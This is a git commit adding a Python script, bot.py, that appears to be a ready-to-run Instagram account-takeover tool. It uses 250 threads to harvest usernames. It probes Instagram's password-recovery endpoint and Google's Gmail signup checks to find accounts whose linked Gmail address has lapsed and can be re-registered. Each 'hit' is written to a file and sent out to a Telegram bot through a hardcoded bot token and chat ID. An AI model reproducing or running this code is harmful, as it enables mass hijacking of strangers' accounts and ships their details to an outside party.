31d963a44d0f94c0b9ffaf217fcfff3e26e52b7d
nikzffx <nikzbahi@gmail.com>
2025-02-10 23:43:46 +0530

    Create bot.py

---
+++ bot.py
@@ -0,0 +1,430 @@
+#
+import os
+try:
+	import time
+except:
+	os.system('pip install time')
+try:
+	import requests
+except:
+	os.system('pip install requests')
+try:
+	import webbrowser
+except:
+	os.system('pip install webbrowser')
+try:
+	import uuid
+except:
+	os.system('pip install uuid')
+try:
+	import random
+except:
+	os.system('pip install random')
+try:
+	import string
+except:
+	os.system('pip install string')
+try:
+	import json
+except:
+	os.system('pip install json')
+try:
+	import hashlib
+except:
+	os.system('pip install hashlib')
+try:
+	import sys
+except:
+	os.system('pip install sys')
+try:
+	import re
+except:
+	os.system('pip install re')
+from datetime import datetime
+#——————————————————————————————————————————————
+try:
+	from threading import Thread
+except:
+	os.system('pip install threading')
+try:
+	from random import randrange
+except:
+		os.system('pip install random')
+try:
+	from requests import post as pp
+except:
+	os.system('pip install requests')
+try:
+	from user_agent import generate_user_agent
+except:
+	os.system('pip install user_agent')
+try:
+	from user_agent import generate_user_agent as gg
+except:
+	os.system('pip install user_agent')
+try:
+	from random import choice as cc
+except:
+	os.system('pip install random')
+try:
+	from random import randrange as rr
+except:
+	os.system('pip install random')
+try:
+    from cfonts import render, say
+except:
+    os.system('pip install python-cfonts')
+import datetime
+##now = datetime.datetime.today()
+##an = datetime.datetime.now()
+an2 = datetime.datetime(2025,1,30,0,0)
+##hours = (now.hour)
+##if an > an2 or an == an2:
+## print('\033[1;32mThe Date : '+ str(an))
+## print('\033[1;31mThe Exp Date : '+ str(an2))
+## time.sleep(1)
+## exit(0)
+##else: 
+## pass  
+        
+#——————————————————————————————————————————————
+def uu():
+    sttt = str(uuid.uuid4())
+    tstt = str(uuid.uuid4()).replace('-', '')
+    return sttt, tstt
+sttt , tstt = uu()
+#——————————————————————————————————————————————
+badig = 0 ; badgm = 0 ; goodig = 0 ; hits = 0 ; aca = 0
+#——————————————————————————————————————————————
+W1 = '\x1b[1;97m'
+W2 = '\x1b[38;5;120m'
+W3 = '\x1b[38;5;204m'
+W4 = '\x1b[38;5;150m'
+W5 = '\x1b[1;33m'
+W6 = '\x1b[1;31m'
+W7 = "\033[1;33m"
+W8 = '\x1b[2;36m'
+W8 = f'\x1b[38;5;117m'
+os.system('clear')
+#——————————————————————————————————————————————
+def date_sc(Id):
+ try:
+  if int(Id) >1 and int(Id)<1279000:
+   return 2010
+  elif int(Id)>1279001 and int(Id)<17750000:
+   return 2011
+  elif int(Id) > 17750001 and int(Id)<279760000:
+   return 2012
+  elif int(Id)>279760001 and int(Id)<900990000:
+   return 2013
+  elif int(Id)>900990001 and int(Id)< 1629010000:
+   return 2014
+  elif int(Id)>1900000000 and int(Id)<2500000000:
+   return 2015
+  elif int(Id)>2500000000 and int(Id)<3713668786:
+   return 2016
+  elif int(Id)>3713668786 and int(Id)<5699785217:
+   return 2017
+  elif int(Id)>5699785217 and int(Id)<8507940634:
+   return 2018
+  elif int(Id)>8507940634 and int(Id)<21254029834:
+   return 2019
+  else:
+   return "2020-2023"
+ except BaseException as EHRA :
+  return EHRA
+adii2 = []
+print("\033[1;37m——————————————————————————————————————————————")
+print(f"  \033[1;32mThis tool valid till \033[1;37m{an2} \033[1;37m")
+print("\033[1;37m——————————————————————————————————————————————")
+print("  \033[1;32mDont forgot to send Hit SS on \033[1;37mDecoded By @SoukPy Join @SoukTool  \033[1;37m")
+print("\033[1;37m——————————————————————————————————————————————")
+token = "7904586048:AAFVPi_uKsHyl96xPvV80mxRfkBEhZyjCrM"
+print("\033[1;37m——————————————————————————————————————————————")
+ID = "7606711394"
+print("\033[1;37m——————————————————————————————————————————————")
+os.system("clear")
+print("\033[1;37m——————————————————————————————————————————————")
+print("\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m1 \033[1;31;40mfor 2012 \n\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m2\033[1;31;40m for 2013 \n\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m3\033[1;31;40m for 2013 \n\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m4\033[1;31;40m for 2014 \n\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m5\033[1;31;40m for 2015 \n\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m6\033[1;31;40m for 2016 \n\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m7\033[1;31;40m for 2017 \n\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m8\033[1;31;40m for 2013-2016 \n\033[1;37;40m[-] \033[1;31;40mPress \033[1;37;40m9\033[1;31;40m for 2014-2024")
+print("\033[1;37m——————————————————————————————————————————————")
+adilw = "1"
+if adilw in ["y","Y","1","01"]:
+	adii2.append('1')
+if adilw in ["y","Y","2","02"]:
+	adii2.append('2')
+if adilw in ["y","Y","3","03"]:
+	adii2.append('3')
+if adilw in ["y","Y","4","04"]:
+	adii2.append('4')
+if adilw in ["y","Y","5","05"]:
+	adii2.append('5')
+if adilw in ["y","Y","6","06"]:
+	adii2.append('6')
+if adilw in ["y","Y","7","07"]:
+	adii2.append('7')
+if adilw in ["y","Y","8","08"]:
+	adii2.append('8')
+if adilw in ["y","Y","9","09"]:
+	adii2.append('9')
+os.system('clear')
+os.system('clear')
+#——————————————————————————————————————————————
+yy = 'azertyuiopmlkjhgfdsqwxcvbn'
+ids = []
+#——————————————————————————————————————————————
+def tll():
+  try:
+    n1=''.join(cc(yy)for i in range(rr(6,9)))
+    n2=''.join(cc(yy)for i in range(rr(3,9)))
+    host=''.join(cc(yy)for i in range(rr(15,30)))
+    he3 = {
+      "accept": "*/*",
+      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
+      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+      "google-accounts-xsrf": "1",
+      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
+      "sec-ch-ua-arch": "\"\"",
+      "sec-ch-ua-bitness": "\"\"",
+      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
+      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
+      "sec-ch-ua-mobile": "?1",
+      "sec-ch-ua-model": "\"ANY-LX2\"",
+      "sec-ch-ua-platform": "\"Android\"",
+      "sec-ch-ua-platform-version": "\"13.0.0\"",
+      "sec-ch-ua-wow64": "?0",
+      "sec-fetch-dest": "empty",
+      "sec-fetch-mode": "cors",
+      "sec-fetch-site": "same-origin",
+      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
+      "x-client-data": "CJjbygE=",
+      "x-same-domain": "1",
+      "Referrer-Policy": "strict-origin-when-cross-origin",
+    'user-agent': str(gg()),
+    }
+    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
+    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
+    cookies={
+      '__Host-GAPS':host
+    }
+    headers = {
+      'authority': 'accounts.google.com',
+      'accept': '*/*',
+      'accept-language': 'en-US,en;q=0.9',
+      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+      'google-accounts-xsrf': '1',
+      'origin': 'https://accounts.google.com',
+      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
+      'user-agent': gg(),
+  }
+    data = {
+    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
+  }
+    response = pp(
+      'https://accounts.google.com/_/signup/validatepersonaldetails',
+      cookies=cookies,
+      headers=headers,
+      data=data,
+  )
+    tl=str(response.text).split('",null,"')[1].split('"')[0]
+    host=response.cookies.get_dict()['__Host-GAPS']
+    try:os.remove('tl.txt')
+    except:pass
+    with open('tl.txt','a') as f:
+      f.write(tl+'//'+host+'\n')
+  except Exception as e:
+    print(e)
+    tll()
+tll()
+#——————————————————————————————————————————————
+def check_gmail(email):
+  if '@' in email:
+    email = str(email).split('@')[0]
+  try:
+    try:
+      o=open('tl.txt','r').read().splitlines()[0]
+    except:
+      tll()
+      o=open('tl.txt','r').read().splitlines()[0]
+    tl,host = o.split('//')
+    cookies = {
+    '__Host-GAPS': host
+  }
+    headers = {
+    'authority': 'accounts.google.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+    'google-accounts-xsrf': '1',
+    'origin': 'https://accounts.google.com',
+    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
+    'user-agent': gg(),
+  }
+    params = {
+    'TL': tl,
+  }
+    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
+    response = pp(
+    'https://accounts.google.com/_/signup/usernameavailability',
+    params=params,
+    cookies=cookies,
+    headers=headers,
+    data=data,
+  )
+    if '"gf.uar",1' in str(response.text):return 'good'
+    elif '"er",null,null,null,null,400' in str(response.text):
+      tll()
+      check_gmail(email)
+    else:return 'bad'
+  except:check_gmail(email)
+#——————————————————————————————————————————————
+import instaloader
+import requests
+
+aca = 0
+
+
+def InfoAcc(username, gg):
+    global aca
+    aca += 1
+
+    # Telegram message template
+    tlg = f'''
+New Instagram Hit by Decoded By @SoukPy Join @SoukTool
+——————————————————————————————————————————————
+- Hit : {aca}
+- Email : {username}@{gg}
+- Reset : {rest(username)}
+- Username : {username}
+- Link : https://www.instagram.com/{username}/
+- Don't forgot to join our Channel Decoded By @SoukPy Join @SoukTool
+——————————————————————————————————————————————
+'''
+
+    # Save to file
+    print(tlg)
+    open('/sdcard/hits.txt', 'a').write(tlg + ' \n')
+
+    # Send to Telegram
+    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+
+def checkIlyass(email):
+  global badig, badgm, hits, aca, goodig
+  ua = generate_user_agent()
+  dev = 'android-'
+  device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
+  uui = str(uuid.uuid4())
+  headers = {'User-Agent': generate_user_agent(),'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',}
+  data = {
+      'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
+        '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+        'adid': uui,
+        'guid': uui,
+        'device_id': device_id,
+        'query': email
+    }),
+    'ig_sig_key_version': '4',
+}
+  response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
+  if str(email) in response:
+        goodig += 1
+        if 'good' == check_gmail(email):
+          hits += 1
+          username, gg = email.split('@')
+          #
+          InfoAcc(username, gg)
+          os.system('cls' if os.name == 'nt' else 'clear')
+          print(f'''\r——————————————————————————————————————————————\n {W2}HITS{W1} : {W2}{hits} \n {W6}BAD Instagram {W1} : {W3}{badig} \n {W4}GOOD Instagram {W1} : {W3}{goodig} \n {W5}BAD Gmail{W1} : {W3}{badgm}\n——————————————————————————————————————————————   \r''')
+        else:
+          badgm += 1
+          #print(" RUN VPN!")
+  else:
+      badig += 1
+      #print(" RUN VPN!")
+      os.system('cls' if os.name == 'nt' else 'clear')
+      print(f'''\r——————————————————————————————————————————————\n {W2}HITS{W1} : {W2}{hits} \n {W6}BAD Instagram {W1} : {W3}{badig} \n {W4}GOOD Instagram {W1} : {W3}{goodig} \n {W5}BAD Gmail{W1} : {W3}{badgm}\n——————————————————————————————————————————————   \r''')
+#——————————————————————————————————————————————   
+def email():
+    while True:
+        try:
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.instagram.com',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
+                'x-ig-app-id': '936619743392459',
+                'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
+                'x-ig-www-claim': 'hmac.AR3iNxyHufbREf9pIUL6m2ciMIIxA3vQTyCHW_yWjgu5dmsq',
+            }
+            if "1" in adii2:
+            	id=str(randrange(1, 17750001))
+            if "2" in adii2:
+            	id=str(randrange(17750001, 279759999))
+            if "3" in adii2:
+            	id=str(randrange(279760001, 900989999))
+            if "4" in adii2:
+            	id=str(randrange(900990001, 1629009999))
+            if "5" in adii2:
+            	id=str(randrange(1900000000, 2500000000))
+            if "6" in adii2:
+            	id=str(randrange(2500000000, 3713668785))
+            if "7" in adii2:
+            	id=str(randrange(3713668786, 5699785216))
+            if "8" in adii2:
+            	id=str(randrange(900990000, 3713668786))
+            if "9" in adii2:
+            	id=str(randrange(1629010000, 70000000000))
+            data = {
+                'av': '17841408545457742',
+                '__user': '0',
+                '__a': '1',
+                '__req': '53',
+                'dpr': '1',
+                '__csr': 'iMkMF5NsIh2I4Aggpik9SLfZgxAZOsJh6DcNcUFXH-GHqnlaoSiypHBiVaFkhtdFmO',
+                '__spin_r': '1014910249',
+                'variables': '{"id":"'+id+'","render_surface":"PROFILE"}',
+                'server_timestamps': 'true',
+                'doc_id': '7663723823674585',
+            }
+            
+            response = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data)
+            username = response.json()['data']['user']['username']
+            email = username + '@gmail.com'
+            checkIlyass(email) 
+        except:pass
+for _ in range(250):
+    Thread(target=email).start()
+#——————————————————————————————————————————————         
+def rest(user):
+  try:
+    headers = {
+    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+    'X-Pigeon-Rawclienttime': '1700251574.982',
+    'X-IG-Connection-Speed': '-1kbps',
+    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+    'X-IG-Bandwidth-TotalBytes-B': '0',
+    'X-IG-Bandwidth-TotalTime-MS': '0',
+    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
+    'X-IG-Connection-Type': 'WIFI',
+    'X-IG-Capabilities': '3brTvw==',
+    'X-IG-App-ID': '567067343352427',
+    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+    'Accept-Language': 'en-GB, en-US',
+     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Host': 'i.instagram.com',
+    'X-FB-HTTP-Engine': 'Liger',
+    'Connection': 'keep-alive',
+    'Content-Length': '356',
+}
+    data = {
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+    'ig_sig_key_version': '4',
+  }
+    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
+    r=response['email']
+  except:
+    r = 'Not Found'
+  return r
